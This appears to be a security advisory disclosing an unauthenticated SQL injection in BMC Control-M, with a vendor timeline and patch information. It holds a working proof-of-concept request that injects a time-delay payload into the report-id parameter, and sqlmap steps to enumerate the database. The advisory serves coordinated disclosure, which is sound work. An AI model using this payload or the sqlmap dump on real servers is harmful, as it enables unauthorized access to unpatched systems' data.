# BMC Control-M Unauthenticated SQL Injection
**BMC Control-M Unauthenticated SQL Injection Version < 9.0.20.200**

**Timeline:**      
**Vulnerability reported to vendor:** 26.08.2022     
**New fixed 9.0.21 version released:** 12.09.2022    
**Patch for version 9.0.20.200 released:** 21.12.2022     
**Disclosure:** 05.06.2023    

**Affected Products:**   
BMC Control-M software up to (including) 9.0.20.200 .
Vulnerability found and confirmed in version 9.0.20.100, information about patch in version 9.0.20.200 comes from the vendor.



BMC Control-M software versions up to (including) 9.0.20.200 are vulnerable to Unauthenticated SQL Injection.    
Vulnerable parameter _report-id_ is present within _/RF-Server/report/deleteReport_ endpoint.    

Below is the Proof of Concept request which triggers a 10 seconds delay:
```
DELETE /RF-Server/report/deleteReport?report-id=’+waitfor+delay+’0:0:10’--
Host: [REDACTED]
Connection: close
user-id: X
Accept: application/json, text/plain, */*
server-name:
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: X
```
Additional Info: _Cookie_ and _user_id_ headers must be present, but the value can be random.     
Screenshot from BurpSuite:    
![poc](https://github.com/DojoSecurity/BMC-Control-M-Unauthenticated-SQL-Injection/assets/44198831/a22930eb-3da5-470e-9116-0d25b35ee5a5)

**Steps to dump the database:**   
Save the above request (without the payload) to a file request.txt :    
```
DELETE /RF-Server/report/deleteReport?report-id=1
Host: [REDACTED]
Connection: close
user-id: X
Accept: application/json, text/plain, */*
server-name:
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: X
```
Execute following _sqlmap_ command:    
```
sqlmap -r request.txt -p report-id —-no-cast —-dbs 
```
Screenshot of extracted database structure:   
![dbscreen](https://github.com/DojoSecurity/BMC-Control-M-Unauthenticated-SQL-Injection/assets/44198831/45e98cb0-de9a-4411-959b-eabc40171634)

